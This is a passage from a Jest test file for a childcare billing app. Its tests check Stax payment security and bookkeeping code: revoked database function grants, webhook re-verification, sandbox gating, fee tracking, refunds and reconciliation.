        expect(boundary.includes('REVOKE EXECUTE ON FUNCTION public.submit_registration(jsonb) FROM PUBLIC')).toBe(true);
        expect(boundary.includes('GRANT EXECUTE ON FUNCTION public.submit_registration(jsonb) TO anon, authenticated')).toBe(true);
    });
});

describe('Stax payment security guards', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const migration = readMigration('harden_stax_payments');
    const feeTrackingMigration = readMigration('track_stax_transaction_fee_and_funding_method');
    const chargeFn = read('supabase/functions/charge-stax-payment/index.ts');
    const webhookFn = read('supabase/functions/stax-webhook/index.ts');

    test('active payment attempts are unique per family, not merely invoice', () => {
        expect(/payment_charge_locks_active_family_idx[\s\S]*?\(family_id\)[\s\S]*?processor_succeeded/.test(migration)).toBe(true);
    });

    test('charge allocation and reversal recording use atomic database functions', () => {
        expect(chargeFn.includes('admin.rpc("stax_finalize_charge"')).toBe(true);
        expect(webhookFn.includes('admin.rpc("stax_record_reversal"')).toBe(true);
        expect(migration.includes('CREATE OR REPLACE FUNCTION public.stax_finalize_charge')).toBe(true);
        expect(migration.includes('CREATE OR REPLACE FUNCTION public.stax_record_reversal')).toBe(true);
    });

    test('privileged Stax database functions are not browser-executable', () => {
        for (const signature of [
            'stax_quote_balance(bigint, uuid)',
            'stax_prepare_charge(bigint, uuid, numeric, text)',
            'stax_finalize_charge(bigint)',
            'stax_record_reversal(text, text, text, numeric)',
        ]) {
            expect(migration.includes(`REVOKE ALL ON FUNCTION public.${signature} FROM PUBLIC, anon, authenticated`)).toBe(true);
        }
        // stax_set_charge_state gained fee/funding-method params in the
        // later migration, which drops the old 4-arg overload rather than
        // leaving it behind unrevoked — assert against the current signature.
        expect(migration.includes('stax_set_charge_state(bigint, text, text, text)')).toBe(true);
        expect(feeTrackingMigration.includes('DROP FUNCTION IF EXISTS public.stax_set_charge_state(bigint, text, text, text)')).toBe(true);
        expect(feeTrackingMigration.includes(
            'REVOKE ALL ON FUNCTION public.stax_set_charge_state(bigint, text, text, text, numeric, text) FROM PUBLIC, anon, authenticated'
        )).toBe(true);
    });

    test('fee and card/ACH funding method are read from Stax\'s own verified response, never guessed', () => {
        // Both charge-stax-payment (the synchronous /charge response) and
        // stax-webhook (the re-fetched /transaction response) must go
        // through the one shared reader, and hand its result straight to
        // stax_set_charge_state rather than inventing their own field names.
        for (const fn of [chargeFn, webhookFn]) {
            expect(fn.includes('import { extractStaxPaymentFields } from "../_shared/stax-transaction-fields.ts"')).toBe(true);
            expect(fn.includes('extractStaxPaymentFields(')).toBe(true);
            expect(fn.includes('p_processor_fee:')).toBe(true);
            expect(fn.includes('p_payment_method:')).toBe(true);
        }
    });

    test('webhook re-fetches the transaction from Stax before mutation', () => {
        const verifyAt = webhookFn.indexOf('/transaction/${encodeURIComponent(eventTransactionId)}');
        const mutateAt = webhookFn.indexOf('admin.rpc("stax_record_reversal"');
        expect(verifyAt).toBeGreaterThan(-1);
        expect(mutateAt).toBeGreaterThan(verifyAt);
    });

    test('charge verifies the payment method belongs to the family customer', () => {
        const lookupAt = chargeFn.indexOf('/payment-method/${encodeURIComponent(paymentMethodId)}');
        const reserveAt = chargeFn.indexOf('admin.rpc("stax_prepare_charge"');
        expect(lookupAt).toBeGreaterThan(-1);
        expect(chargeFn.includes('verifiedMethod?.customer_id')).toBe(true);
        expect(reserveAt).toBeGreaterThan(lookupAt);
    });

    test('client never reads a Stax PENDING (HTTP 202) response as a confirmed charge', () => {
        // The edge function returns 202 for PENDING — a 2xx status, so
        // supabase-js resolves it as `data` rather than `error`. Without an
        // explicit check, the caller's generic "!== true" guard discards the
        // real ambiguous/still-processing message the server sent.
        const supabaseJs = read('js/supabase.js');
        const start = supabaseJs.indexOf('async function chargeStaxPayment');
        const end = supabaseJs.indexOf('async function adminRefundPayment');
        expect(start).toBeGreaterThan(-1);
        expect(end).toBeGreaterThan(start);
        const fnBody = supabaseJs.slice(start, end);
        expect(fnBody.includes('data.success !== true')).toBe(true);
        expect(fnBody.includes('data.ambiguous')).toBe(true);
        expect(fnBody.includes("data.error || 'Your payment could not be confirmed.'")).toBe(true);
    });

    test('webhook records only processor-verified successful transactions', () => {
        const successAt = webhookFn.indexOf('const verifiedSuccess = transaction?.success === true');
        const reversalAt = webhookFn.indexOf('admin.rpc("stax_record_reversal"');
        expect(successAt).toBeGreaterThan(-1);
        expect(webhookFn.indexOf('if (!verifiedSuccess)', successAt)).toBeGreaterThan(successAt);
        expect(reversalAt).toBeGreaterThan(successAt);
    });

    test('client request carries the stable server-created payment attempt id', () => {
        const createFn = read('supabase/functions/create-stax-charge/index.ts');
        const client = read('js/supabase.js');
        expect(createFn.includes('paymentAttemptId: crypto.randomUUID()')).toBe(true);
        expect(client.includes('paymentAttemptId: opts?.paymentAttemptId')).toBe(true);
        expect(chargeFn.includes('idempotency_id: paymentAttemptId')).toBe(true);
    });

    test('normal parent Pay online button never sends sandboxTest true without the URL flag', () => {
        // The button itself is unchanged — same class, same label, no
        // "(test)" text a real parent could be confused by. pbStaxTestEnabled()
        // gates whether the underlying calls carry sandboxTest:true, and it
        // reads sessionStorage/the URL rather than defaulting true.
        const portal = read('js/parent/parent-billing.js');
        expect(portal.includes('class="pb-pay-btn pb-stax-btn"')).toBe(true);
        expect(portal.includes('with Stax (test)')).toBe(false);
        expect(portal.includes('function pbStaxTestEnabled()')).toBe(true);
        expect(portal.includes("get('staxtest') === '1'")).toBe(true);
        expect(portal.includes('sandboxTest: pbStaxTestEnabled()')).toBe(true);
    });

    test('parent Stax endpoints fail closed unless production OR an explicit two-signal sandbox test', () => {
        // Reintroduced 2026-08-28 so the real Stax.js flow can be
        // click-tested against the sandbox merchant before a production
        // Stax account exists. Must require BOTH a server secret
        // (STAX_SANDBOX_TEST_ENABLED) and a per-request client signal
        // (sandboxTest) — either alone must never be enough, since a real
        // parent's normal request never sets sandboxTest and the server
        // secret is meant to be a deliberate, temporary opt-in.
        const createFn = read('supabase/functions/create-stax-charge/index.ts');
        for (const fn of [createFn, chargeFn]) {
            expect(fn.includes('STAX_ENVIRONMENT')).toBe(true);
            expect(fn.includes('=== "production"')).toBe(true);
            expect(fn.includes('STAX_SANDBOX_TEST_ENABLED')).toBe(true);
            expect(fn.includes('body?.sandboxTest === true')).toBe(true);
            expect(fn.includes('!isProduction && !sandboxTestAllowed')).toBe(true);
        }
    });

    // Authorize.net was removed 2026-08-30 ("it is stax or nothing"), so the
    // old fallback-to-hosted-checkout guard became the opposite requirement:
    // there must be NO second processor to silently divert a payment to.
    test('a gated Stax tells the parent plainly — there is no second processor to fall back to', () => {
        const portal = read('js/parent/parent-billing.js');
        expect(portal.includes("e?.message === 'Online payments are not configured for production yet.'")).toBe(true);
        expect(portal.includes('Online payment is not available yet. Please contact the office')).toBe(true);
        // Every trace of the Accept Hosted flow is gone from the portal.
        ['pbStartPayment', 'pbClosePayModal', 'CommunicationHandler', 'pbPayFrame'].forEach(sym => {
            expect(portal.includes(sym + '(') || portal.includes("'" + sym + "'")).toBe(false);
        });
        expect(read('parent.html').includes('pbPayModal')).toBe(false);
    });

    test('saved-card response does not expose the opaque payment method id', () => {
        const createFn = read('supabase/functions/create-stax-charge/index.ts');
        const savedCardBlock = createFn.match(/savedCard:[\s\S]*?\} : null/);
        if (!savedCardBlock) throw new Error('savedCard response block not found');
        expect(savedCardBlock[0].includes('paymentMethodId')).toBe(false);
    });

    test('temporary webhook-admin function is inert and JWT protected in source config', () => {
        const tempFn = read('supabase/functions/stax-webhook-admin-tmp/index.ts');
        const config = read('supabase/config.toml');
        expect(tempFn.includes('status: 410')).toBe(true);
        expect(tempFn.includes('Deno.env')).toBe(false);
        expect(/\[functions\.stax-webhook-admin-tmp\][\s\S]*?verify_jwt\s*=\s*true/.test(config)).toBe(true);
    });

    test('_headers and worker.js ship identical CSP values', () => {
        const headersMatch = read('_headers').match(/^\s*Content-Security-Policy:\s*(.+)$/m);
        if (!headersMatch) throw new Error('CSP missing from _headers');
        const workerMatch = read('worker.js').match(/newHeaders\.set\(\s*'Content-Security-Policy',([\s\S]*?)\n\s*\);/);
        if (!workerMatch) throw new Error('CSP setter missing from worker.js');
        // The captured expression is a concatenation of repository-owned
        // string literals and comments; evaluating it yields the actual header.
        // eslint-disable-next-line no-eval
        const workerCsp = eval(workerMatch[1]);
        expect(workerCsp).toBe(headersMatch[1].trim());
    });

    test('public bundles contain no server-side Stax or Supabase secret names', () => {
        const bundles = read('dist/parent.min.js') + read('dist/supabase.min.js');
        for (const secretName of ['STAX_API_KEY', 'STAX_WEBHOOK_SECRET', 'SUPABASE_SERVICE_ROLE_KEY']) {
            expect(bundles.includes(secretName)).toBe(false);
        }
    });
});

describe('Stax processor fee / card-vs-ACH tracking', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const feeMigration = readMigration('track_stax_transaction_fee_and_funding_method');
    const financeHubJs = read('js/admin/admin-finance-hub.js');

    test('billing_payments and payment_charge_locks both gain a processor_fee column', () => {
        expect(feeMigration.includes('ADD COLUMN IF NOT EXISTS processor_fee numeric(12,2)')).toBe(true);
        expect(/ALTER TABLE public\.billing_payments[\s\S]*?processor_fee/.test(feeMigration)).toBe(true);
        expect(/ALTER TABLE public\.payment_charge_locks[\s\S]*?processor_fee/.test(feeMigration)).toBe(true);
    });

    test('funding method reuses the existing payment_method column/vocabulary instead of a parallel column', () => {
        // billing_payments.payment_method already documented 'ach' as a
        // valid value before this feature existed — Stax charges just never
        // used it. A new column here would fork the same concept in two
        // places for no reason.
        expect(feeMigration.includes("payment_method IN ('card', 'ach')")).toBe(true);
        expect(feeMigration.includes("v_lock.family_id, v_row.invoice_id, v_amount, current_date, v_payment_method")).toBe(true);
    });

    test('a rolled-up multi-invoice charge splits its fee proportionally, never duplicates it per invoice', () => {
        expect(feeMigration.includes('v_row_fee := CASE')).toBe(true);
        expect(feeMigration.includes('round(v_lock.processor_fee * v_amount / v_lock.charge_amount, 2)')).toBe(true);
    });

    test('a refund/void inherits the original payment\'s funding method rather than assuming card', () => {
        expect(feeMigration.includes('original.payment_method')).toBe(true);
        expect(feeMigration.includes("coalesce(v_row.payment_method, 'card')")).toBe(true);
    });

    test('the old 4-arg stax_set_charge_state is dropped, not left behind as an unrevoked overload', () => {
        expect(feeMigration.includes('DROP FUNCTION IF EXISTS public.stax_set_charge_state(bigint, text, text, text);')).toBe(true);
        expect(feeMigration.includes(
            'GRANT EXECUTE ON FUNCTION public.stax_set_charge_state(bigint, text, text, text, numeric, text) TO service_role;'
        )).toBe(true);
    });

    test('finance table shows the fee and whether Stax funded from a card or ACH', () => {
        expect(financeHubJs.includes("_fhPaymentsHeaderCell('Fee', 'fee')")).toBe(true);
        expect(financeHubJs.includes("if (p.payment_method === 'ach') return 'Stax · ACH';")).toBe(true);
        expect(financeHubJs.includes('p.processor_fee != null ? _fhMoney(p.processor_fee)')).toBe(true);
    });
});

describe('Stax card funding type (debit vs. credit) tracking', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const fundingMigration = readMigration('track_stax_card_funding_type');
    const sharedFields = read('supabase/functions/_shared/stax-transaction-fields.ts');
    const financeHubJs = read('js/admin/admin-finance-hub.js');

    test('the shared field extractor reads bin_type, unlike payment_method it has no forced default', () => {
        expect(sharedFields.includes('cardFundingType: "debit" | "credit" | null')).toBe(true);
        expect(sharedFields.includes('methodInfo?.bin_type')).toBe(true);
        expect(sharedFields.includes('rawBinType === "debit" ? "debit" : rawBinType === "credit" ? "credit" : null')).toBe(true);
    });

    test('billing_payments and payment_charge_locks both gain a checked card_funding_type column', () => {
        expect(/ALTER TABLE public\.billing_payments[\s\S]*?card_funding_type/.test(fundingMigration)).toBe(true);
        expect(/ALTER TABLE public\.payment_charge_locks[\s\S]*?card_funding_type/.test(fundingMigration)).toBe(true);
        expect(fundingMigration.includes("card_funding_type IN ('debit', 'credit')")).toBe(true);
    });

    test('the old 6-arg stax_set_charge_state is dropped, not left behind as an unrevoked overload', () => {
        expect(fundingMigration.includes(
            'DROP FUNCTION IF EXISTS public.stax_set_charge_state(bigint, text, text, text, numeric, text);'
        )).toBe(true);
        expect(fundingMigration.includes(
            'GRANT EXECUTE ON FUNCTION public.stax_set_charge_state(bigint, text, text, text, numeric, text, text) TO service_role;'
        )).toBe(true);
    });

    test('a refund/void carries the original funding type forward, same as payment_method', () => {
        expect(fundingMigration.includes('original.card_funding_type')).toBe(true);
        expect(fundingMigration.includes('v_row.card_funding_type')).toBe(true);
    });

    for (const fn of ['charge-stax-payment', 'stax-webhook', 'reconcile-stax-payments']) {
        test(`${fn} records the funding type it read from Stax`, () => {
            const source = read(`supabase/functions/${fn}/index.ts`);
            expect(source.includes('p_card_funding_type:')).toBe(true);
        });
    }

    test('finance table shows debit/credit for a Stax card payment, ACH unaffected', () => {
        expect(financeHubJs.includes("if (p.card_funding_type === 'debit') return 'Stax · Debit';")).toBe(true);
        expect(financeHubJs.includes("if (p.card_funding_type === 'credit') return 'Stax · Credit';")).toBe(true);
        expect(financeHubJs.includes("return 'Stax · Card';")).toBe(true);
    });
});

describe('Stax processor fee settlement backfill job', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const backfillFn = read('supabase/functions/backfill-stax-processor-fees/index.ts');
    const backfillMigration = readMigration('stax_processor_fee_backfill');

    test('reuses the exact same transaction lookup and field extraction every other Stax path trusts', () => {
        expect(backfillFn.includes('import { extractStaxPaymentFields } from "../_shared/stax-transaction-fields.ts"')).toBe(true);
        expect(backfillFn.includes('/transaction/${encodeURIComponent(id)}`')).toBe(true);
        expect(backfillFn.includes('extractStaxPaymentFields(t)')).toBe(true);
    });

    test('only ever writes a fee through the dedicated backfill RPC, never touches billing_payments directly', () => {
        expect(backfillFn.includes('admin.rpc("stax_backfill_processor_fee"')).toBe(true);
        expect(backfillFn.includes('.from("billing_payments")\n            .select(')).toBe(true);
        expect(/\.from\("billing_payments"\)[\s\S]*?\.update\(/.test(backfillFn)).toBe(false);
    });

    test('the RPC is idempotent — a row already carrying a fee is excluded from the update loop', () => {
        const loopStart = backfillMigration.indexOf('FOR v_row IN');
        const loopBlock = backfillMigration.slice(loopStart, backfillMigration.indexOf('END LOOP', loopStart));
        expect(loopBlock.includes('AND processor_fee IS NULL')).toBe(true);
    });

    test('splits a multi-invoice charge\'s fee proportionally, the same math stax_finalize_charge uses', () => {
        expect(backfillMigration.includes('round(p_processor_fee * v_row.amount / v_total_amount, 2)')).toBe(true);
    });

    test('only looks back BACKFILL_WINDOW_DAYS, so a transaction Stax never settles doesn\'t get polled forever', () => {
        expect(backfillFn.includes('BACKFILL_WINDOW_DAYS')).toBe(true);
        expect(backfillFn.includes('.gte("created_at", windowStart)')).toBe(true);
    });

    test('tries the oldest pending transactions first so a large backlog can\'t starve them out', () => {
        expect(backfillFn.includes('earliestByTransaction')).toBe(true);
        expect(backfillFn.includes('.sort((a, b) => (earliestByTransaction.get(a)! < earliestByTransaction.get(b)! ? -1 : 1))')).toBe(true);
    });

    test('the RPC is restricted to service_role, same as every other Stax-writing RPC', () => {
        expect(backfillMigration.includes(
            'REVOKE ALL ON FUNCTION public.stax_backfill_processor_fee(text, numeric) FROM PUBLIC, anon, authenticated;'
        )).toBe(true);
        expect(backfillMigration.includes(
            'GRANT EXECUTE ON FUNCTION public.stax_backfill_processor_fee(text, numeric) TO service_role;'
        )).toBe(true);
    });

    test('scheduled once a day via the same vault-secret cron pattern as the other jobs', () => {
        expect(backfillMigration.includes("cron.schedule('backfill-stax-processor-fees', '0 12 * * *'")).toBe(true);
        expect(backfillMigration.includes("vault.decrypted_secrets WHERE name = 'mymdo_cron_secret'")).toBe(true);
        expect(/sb_secret_|sb_[a-z]+_[A-Za-z0-9_-]{20,}/.test(backfillMigration)).toBe(false);
    });

    test('authenticates through the shared cron guard, like the other scheduled Stax job', () => {
        expect(backfillFn.includes('isAuthorizedCronRequest(req)')).toBe(true);
    });
});

describe('All Payments search finds a payment by invoice number, not just family name', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const financeHubJs = read('js/admin/admin-finance-hub.js');
    const adminHtml = read('admin.html');

    test('the search box invites an invoice number, not just a family name', () => {
        expect(adminHtml.includes('id="fhPaymentsSearch"')).toBe(true);
        expect(adminHtml.includes('placeholder="Find a family or invoice #&hellip;"')).toBe(true);
    });

    test('typing an invoice number (with or without the INV- prefix) matches its payment', () => {
        const start = financeHubJs.indexOf('function _fhRenderAllPaymentsTable');
        const end = financeHubJs.indexOf('\n}', financeHubJs.indexOf('root.innerHTML = `', start));
        const fnBody = financeHubJs.slice(start, end);
        expect(fnBody.includes('const invoiceLabel = p.invoice_id != null')).toBe(true);
        expect(fnBody.includes('invoiceLabel.includes(q)')).toBe(true);
        // Still matches by family name too — this adds a second match path,
        // it doesn't replace the first.
        expect(fnBody.includes("(p._fam?.parent_name || '').toLowerCase().includes(q)")).toBe(true);
    });
});

describe('All Payments table is sortable by clicking a column header', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const financeHubJs = read('js/admin/admin-finance-hub.js');

    test('every visible column has a sort getter and a clickable header', () => {
        const columnLabels = { date: 'Date', family: 'Family', amount: 'Amount', method: 'Method', fee: 'Fee', invoice: 'Invoice' };
        for (const [key, label] of Object.entries(columnLabels)) {
            expect(financeHubJs.includes(`${key}:`)).toBe(true);
            expect(financeHubJs.includes(`_fhPaymentsHeaderCell('${label}', '${key}')`)).toBe(true);
        }
    });

    test('clicking the active column flips direction instead of resetting it', () => {
        const start = financeHubJs.indexOf('function _fhTogglePaymentsSort');
        const end = financeHubJs.indexOf('\n}', start);
        const fnBody = financeHubJs.slice(start, end);
        expect(fnBody.includes("_fhPaymentsSortDir = _fhPaymentsSortDir === 'asc' ? 'desc' : 'asc';")).toBe(true);
    });

    test('the default sort (date, newest first) reproduces the table\'s original fixed ordering', () => {
        expect(financeHubJs.includes("let _fhPaymentsSortKey = 'date';")).toBe(true);
        expect(financeHubJs.includes("let _fhPaymentsSortDir = 'desc';")).toBe(true);
        // Same tiebreak the table always used, so a fresh page load looks
        // identical to before this feature existed.
        const start = financeHubJs.indexOf('function _fhSortPayments');
        const end = financeHubJs.indexOf('\n}', start);
        expect(financeHubJs.slice(start, end).includes('(b.id || 0) - (a.id || 0)')).toBe(true);
    });

    test('the Method column sorts by the exact same label the cell displays', () => {
        // A sort that disagreed with the printed label (e.g. sorting by raw
        // processor/payment_method instead of the "Stax · ACH" text) would
        // look broken to anyone actually reading the column while sorting it.
        const getterLine = financeHubJs.match(/method:\s*p => (.+),/);
        if (!getterLine) throw new Error('method sort getter not found');
        expect(getterLine[1].includes('_fhPaymentMethodLabel(p)')).toBe(true);
    });

    test('a missing fee or invoice never crashes the sort — both fall back to a plain number', () => {
        const feeLine = financeHubJs.match(/fee:\s*p => (.+),/);
        const invoiceLine = financeHubJs.match(/invoice:\s*p => (.+),/);
        if (!feeLine || !invoiceLine) throw new Error('fee/invoice sort getters not found');
        expect(feeLine[1].includes('!= null')).toBe(true);
        expect(invoiceLine[1].includes('!= null')).toBe(true);
    });
});

describe('admin-refund-stax-payment — Stax reversal support, wired into the LIVE Ledger drawer', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const refundFn = read('supabase/functions/admin-refund-stax-payment/index.ts');
    const billingJs = read('js/admin/admin-billing.js');
    const financeHubJs = read('js/admin/admin-finance-hub.js');
    const portalJs = read('js/admin/admin-portal.js');
    const supabaseJs = read('js/supabase.js');

    test('requires a full-admin session, same gate as the Authorize.net refund function', () => {
        expect(refundFn.includes('callerRole !== "full"')).toBe(true);
        expect(refundFn.includes('auth.getUser()')).toBe(true);
    });

    test('only a stax-processed positive charge, not yet reversed, can be refunded', () => {
        expect(refundFn.includes('payment.processor !== "stax"')).toBe(true);
        expect(refundFn.includes('payment.refund_of_payment_id')).toBe(true);
        expect(refundFn.includes('existingReversal')).toBe(true);
    });

    test('void vs refund is read from Stax\'s own is_voidable flag, never guessed locally', () => {
        const lookupAt = refundFn.indexOf('/transaction/${encodeURIComponent(transactionId)}`');
        const voidableAt = refundFn.indexOf('tx.is_voidable === true');
        expect(lookupAt).toBeGreaterThan(-1);
        expect(voidableAt).toBeGreaterThan(lookupAt);
    });

    test('the refund amount is always this payment\'s own recorded amount, never client input', () => {
        expect(refundFn.includes('body?.paymentId')).toBe(true);
        expect(refundFn.includes('Number(payment.amount).toFixed(2)')).toBe(true);
        expect(/body\??\.(amount|total)/.test(refundFn)).toBe(false);
    });

    test('the "-inv<id>"/"-credit" suffix is stripped before calling Stax, never sent to the processor', () => {
        expect(refundFn.includes('function baseTransactionId')).toBe(true);
        expect(refundFn.includes('replace(/-inv\\d+$/')).toBe(true);
        const callSite = refundFn.indexOf('baseTransactionId(payment.processor_transaction_id)');
        expect(callSite).toBeGreaterThan(-1);
    });

    test('does not touch billing_payments or invoice status — the webhook records the reversal', () => {
        expect(refundFn.includes(".from(\"billing_payments\")\n            .update")).toBe(false);
        expect(refundFn.includes('billing_invoices')).toBe(false);
    });

    test('adminRefundPayment has exactly one destination and refuses any other processor', () => {
        const start = supabaseJs.indexOf('async function adminRefundPayment');
        const end = supabaseJs.indexOf('async function unmarkInvoiceSent');
        expect(start).toBeGreaterThan(-1);
        expect(end).toBeGreaterThan(start);
        const fnBody = supabaseJs.slice(start, end);
        expect(fnBody.includes("const fnName = 'admin-refund-stax-payment';")).toBe(true);
        // Authorize.net is retired: an unknown processor must raise, never
        // fall through to an edge function that is now an inert 410 stub.
        expect(fnBody.includes("if (processor && processor !== 'stax')")).toBe(true);
        expect(fnBody.includes('admin-refund-payment')).toBe(false);
    });

    // ⚠️ billingArSection (the old admin-billing.js AR table this refund
    // logic was first added to) was retired from AP_TOOLS in the Bookkeeper
    // overhaul (2026-08-27) and is unreachable in the live admin shell — its
    // own comment in admin-portal.js says so. A Refund button added only
    // there would be dead code nobody could ever click. This guard fails if
    // that ever silently becomes reachable again without someone re-checking
    // whether admin-billing.js's refund wiring should move with it.
    test('billingArSection (admin-billing.js\'s AR table) is still unreferenced by AP_TOOLS — confirms it is dead code', () => {
        expect(billingJs.includes('pay-hist-refund-btn')).toBe(true); // the old wiring still exists...
        expect(portalJs.includes('billingArSection')).toBe(false);   // ...but is not reachable from the shell.
    });

    // ⚠️ Same bug class as billingArSection above, found 2026-08-31 while
    // telling the director where to click to import a ProCare payment
    // export: #billingPaymentsSection exists in admin.html and its handlers
    // are wired unconditionally by setupBilling(), but no AP_TOOLS entry
    // pointed at it, so the shell could never show it. Unlike the AR table,
    // this one has NO replacement in Bookkeeper — the Ledger's
    // "+ Record payment" enters a single payment by hand; nothing else does
    // a bulk import with a preview, a duplicate guard and name matching.
    // These guards fail if the entry is dropped again, or if its `pane`
    // stops matching where the section really lives (apShowSection() hides
    // every .tab-pane whose id isn't 'tab-' + tool.pane, so a wrong `pane`
    // hides the section along with its own tab — the exact trap that made
    // attBoard/incidents/drills and staffInjury/clockIntegrity blank).
    test('ProCare Import is reachable from the shell', () => {
        const entry = portalJs.split('\n').find(l =>
            l.includes("section: 'billingPaymentsSection'") && l.trim().startsWith('{'));
        expect(entry === undefined).toBe(false);
        expect(entry.includes("pane: 'finance'")).toBe(true);   // matches #tab-finance in admin.html
        expect(entry.includes("tab: 'finance'")).toBe(true);
    });

    test('ProCare Import stays full-admin only, via the finance tab gate', () => {
        // Finance is in AP_FULL_ONLY_TABS, so the tool needs no key of its
        // own — but if finance ever leaves that list, payment import must
        // not quietly open up to `restricted`.
        const fullOnlyTabs = portalJs.match(/AP_FULL_ONLY_TABS\s*=\s*[^;]+;/);
        expect(fullOnlyTabs === null).toBe(false);
        expect(fullOnlyTabs[0].includes("'finance'")).toBe(true);
    });

    test('the ProCare importer still guards against re-importing rows already recorded', () => {
        expect(billingJs.includes('function _procareDupKey(')).toBe(true);
        // The guard is the filter in _confirmProCareImport, not the preview count.
        const confirmAt = billingJs.indexOf('async function _confirmProCareImport');
        expect(confirmAt).toBeGreaterThan(-1);
        expect(billingJs.slice(confirmAt, confirmAt + 900).includes('!r.alreadyImported')).toBe(true);
    });

    test('the LIVE Ledger drawer (Finance → Ledger, the reachable Accounts Receivable view) shows a Refund control per payment', () => {
        expect(financeHubJs.includes('function _fhCanRefund(')).toBe(true);
        expect(financeHubJs.includes("REFUNDABLE_PROCESSORS = new Set(['stax'])")).toBe(true);
        expect(financeHubJs.includes('data-processor="${escHtml(p.processor)}"')).toBe(true);
        expect(financeHubJs.includes('async function _fhRefundPayment(')).toBe(true);
        expect(financeHubJs.includes("adminRefundPayment(paymentId, processor)")).toBe(true);
    });

    test('drawer refund keeps _fhRows/Bookkeeper in sync afterward, same reload pattern as recording a payment', () => {
        const submitPaymentAt = financeHubJs.indexOf('async function _fhSubmitPayment');
        const refundAt = financeHubJs.indexOf('async function _fhRefundPayment');
        expect(submitPaymentAt).toBeGreaterThan(-1);
        expect(refundAt).toBeGreaterThan(-1);
        const refundBody = financeHubJs.slice(refundAt, financeHubJs.indexOf('\n}', refundAt));
        expect(refundBody.includes('await _fhLoad()')).toBe(true);
        expect(refundBody.includes('_fhRenderDrawer()')).toBe(true);
    });

    test('a payment already reversed, or itself a reversal, never shows a second Refund button', () => {
        const start = financeHubJs.indexOf('function _fhCanRefund');
        const end = financeHubJs.indexOf('\n}', start);
        const fnBody = financeHubJs.slice(start, end);
        expect(fnBody.includes('p.refund_of_payment_id')).toBe(true);
        expect(fnBody.includes('allPayments.some(o => o.refund_of_payment_id === p.id)')).toBe(true);
    });

    // ⚠️ Same bug class as billingArSection/#billingPaymentsSection above,
    // found 2026-09-02: unmarkInvoiceSent() (js/supabase.js) — "Undo a send
    // stamp — for a bill marked issued by mistake" — existed since early
    // invoicing work but was only ever called from renderInvoiceList()'s
    // "Undo send" button in admin-billing.js, which mounts into #invBody —
    // an id that no longer exists anywhere in admin.html. A real, tested
    // function with no button a human could ever click. Wired into the LIVE
    // Ledger drawer instead, same fix as the Refund button.
    test('unmarkInvoiceSent exists and is a plain revert-to-draft, not a delta write', () => {
        const start = supabaseJs.indexOf('async function unmarkInvoiceSent');
        expect(start).toBeGreaterThan(-1);
        const body = supabaseJs.slice(start, supabaseJs.indexOf('\n}', start));
        expect(body.includes("status: 'draft'")).toBe(true);
        expect(body.includes('sent_at: null')).toBe(true);
        expect(body.includes('sent_to: null')).toBe(true);
    });

    test('the LIVE Ledger drawer shows Undo send only on a sent invoice with nothing collected against it yet', () => {
        expect(financeHubJs.includes('async function _fhUndoSend(')).toBe(true);
        expect(financeHubJs.includes("id=\"fhUndoSendBtn\"")).toBe(true);
        // Gated in the markup, not just in the handler — a hidden button
        // is the difference between "can't click it" and "never offered".
        const gateAt = financeHubJs.indexOf("row.status === 'sent' && !((row.ar?.collected || 0) > 0)");
        expect(gateAt).toBeGreaterThan(-1);
    });

    test('Undo send confirms, never silently recalls an email already delivered', () => {
        const start = financeHubJs.indexOf('async function _fhUndoSend');
        const body = financeHubJs.slice(start, financeHubJs.indexOf('\n}', start));
        expect(body.includes('unmarkInvoiceSent(row.ar.invoiceId)')).toBe(true);
        expect(/confirm\(['"`]/.test(body)).toBe(true);
        expect(body.toLowerCase().includes('does not') || body.toLowerCase().includes('does not recall')).toBe(true);
    });

    test('Undo send keeps _fhRows/Bookkeeper in sync afterward, same reload pattern as refund/payment', () => {
        const start = financeHubJs.indexOf('async function _fhUndoSend');
        const body = financeHubJs.slice(start, financeHubJs.indexOf('\n}', start));
        expect(body.includes('await _fhLoad()')).toBe(true);
        expect(body.includes('_fhRenderDrawer()')).toBe(true);
    });
});

describe('Stax payment reconciliation job', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const reconcileFn = read('supabase/functions/reconcile-stax-payments/index.ts');

    test('the list endpoint is used only for discovery, never trusted for a decision', () => {
        // Every decision (recover vs. release) must be made from a
        // verifyTransaction() result, not from listCandidateTransactionIds().
        const decisionBlock = reconcileFn.slice(
            reconcileFn.indexOf('let matched: any = null;'),
            reconcileFn.indexOf('await admin.from("admin_audit_log")'),
        );
        expect(decisionBlock.includes('verifyTransaction(')).toBe(true);
        expect(/matched\.(success|status|id)/.test(decisionBlock)).toBe(true);
        // listCandidateTransactionIds' own return value (candidateIds) is only
        // ever iterated to call verifyTransaction — never read for success/status.
        expect(/candidateIds\.(success|status)/.test(decisionBlock)).toBe(false);
    });

    test('recovery reuses the same atomic RPCs the webhook already uses, no new billing logic', () => {
        expect(reconcileFn.includes('admin.rpc("stax_set_charge_state"')).toBe(true);
        expect(reconcileFn.includes('admin.rpc("stax_finalize_charge"')).toBe(true);
    });

    test('a reconciliation-recovered charge records fee and funding method too, same as the webhook path', () => {
        expect(reconcileFn.includes('import { extractStaxPaymentFields } from "../_shared/stax-transaction-fields.ts"')).toBe(true);
        expect(reconcileFn.includes('extractStaxPaymentFields(matched)')).toBe(true);
        expect(reconcileFn.includes('p_processor_fee: staxFields.processorFee')).toBe(true);
        expect(reconcileFn.includes('p_payment_method: staxFields.paymentMethod')).toBe(true);
    });

    test('a stale lock with no matching Stax transaction is eventually released, not locked out forever', () => {
        expect(reconcileFn.includes("p_status: \"failed\"")).toBe(true);
        expect(reconcileFn.includes('RELEASE_HOURS')).toBe(true);
